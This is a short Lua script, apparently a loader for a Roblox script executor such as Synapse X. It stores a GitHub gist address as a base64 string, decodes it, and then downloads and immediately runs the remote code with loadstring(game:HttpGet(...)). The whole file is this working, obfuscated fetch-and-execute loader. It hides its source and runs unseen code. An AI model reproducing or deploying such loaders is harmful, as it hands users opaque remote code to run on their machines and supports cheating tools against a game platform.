local str = "aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vR2hvc3REdWNreXkvZmJjNjM4NmY1ODI3YjllZGZjMDUxM2Y1ZTUwNWQ1ZWUvcmF3"
function decode(strs)
    local code = tostring(strs)
    if  syn and syn.crypt.base64.decode then
        local _Pog = syn.crypt.base64.decode(code)
        return _Pog
    else
        local _Pog = base64_decode(code)
        return _Pog
    end
end
local url = decode(str)
loadstring(game:HttpGet(tostring(url),true))()
